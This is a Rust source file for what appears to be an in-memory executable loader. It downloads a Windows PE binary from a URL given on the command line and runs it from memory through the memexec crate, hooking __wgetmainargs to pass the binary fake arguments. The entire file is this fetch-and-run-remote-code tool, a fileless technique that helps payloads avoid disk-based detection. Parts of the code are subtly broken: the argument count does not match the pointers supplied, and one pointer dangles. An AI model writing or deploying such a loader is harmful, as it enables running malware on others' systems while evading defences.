use memexec;
use memexec::peloader::ExeLoader;
use memexec::peparser::PE;
use std::collections::HashMap;
use std::io::Read;
use std::mem;
use std::os::raw::c_void;

static mut _args: String = String::new();
static mut _raw_binary: Vec<u8> = Vec::new();

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
extern "win64" fn __wgetmainargs(
    _Argc: *mut i32,
    _Argv: *mut *const *const u16,
    _Env: *const c_void,
    _DoWildCard: i32,
    _StartInfo: *const c_void,
) -> i32 {
    unsafe {
        *_Argc = 4;

        let a0: Vec<_> = "program_name".chars().map(|c| (c as u16).to_le()).collect();

        let a1: Vec<_> = _args.chars().map(|c| (c as u16).to_le()).collect();
        print!("a1: {}\n", String::from_utf16(&a1).unwrap().to_string());

        let a3: Vec<_> = "exit\0".chars().map(|c| (c as u16).to_le()).collect();

        *_Argv = [a0.as_ptr(), a1.as_ptr(), a3.as_ptr()].as_ptr();

        mem::forget(a0);
        mem::forget(a1);
        mem::forget(a3);

        // argsv.push(a0.as_ptr());

        // for arg in _args.iter() {
        //     let mut arg_clone = arg.clone();
        //     println!("arg_clone: {}", arg_clone);
        //     let a1: Vec<_> = arg_clone
        //         .chars()
        //         .map(|c| (c as u16).to_le())
        //         .collect();

        //     argsv.push(a1.as_ptr());
        // }

        // *_Argv = argsv.as_ptr();

        // Avoid calling destructor

        // for arg in argsv.iter() {
        //     mem::forget(arg);
        // }
    }

    0
}

fn main() {
    unsafe {

    // Get the URL and additional arguments from the user
    let mut args = std::env::args();
    let url = args.nth(1).expect("Missing URL argument");

    // Download the contents of the URL
    let response = reqwest::blocking::get(url).expect("Failed to download file");
    let mut content = Vec::new();
    content = response.bytes().expect("Failed to read file").to_vec();
        _args = args.collect::<Vec<String>>().join(" \0");
        print!("args: {}\n", _args);
        _raw_binary = content;

        let mut hooks = HashMap::new();

        hooks.insert(
            "msvcrt.dll!__wgetmainargs".into(),
            mem::transmute::<
                extern "win64" fn(
                    *mut i32,
                    *mut *const *const u16,
                    *const c_void,
                    i32,
                    *const c_void,
                ) -> i32,
                *const c_void,
            >(__wgetmainargs),
        );

        match PE::new(&_raw_binary) {
            Ok(pe) => {
                if (mem::size_of::<usize>() == 4 && pe.is_x86())
                    || (mem::size_of::<usize>() == 8 && pe.is_x64())
                {
                    println!("is_x86 status: {}", pe.is_x86());
                    println!("is_x64: {}", pe.is_x64());
                } else {
                    println!("Error::MismatchedArch");
                    println!("is_x86 status: {}", pe.is_x86());
                    println!("is_x64 status: {}", pe.is_x64());
                    println!("memusize: {}", mem::size_of::<usize>());
                }

                match ExeLoader::new(&pe, Some(&hooks)) {
                    Ok(loader) => {
                        loader.invoke_entry_point();
                    }
                    Err(e) => {
                        println!("errorExeLoader {:?}", e);
                    }
                }
            }
            Err(e) => {
                println!("errorPE:? {:?}", e);
            }
        }
    }
}
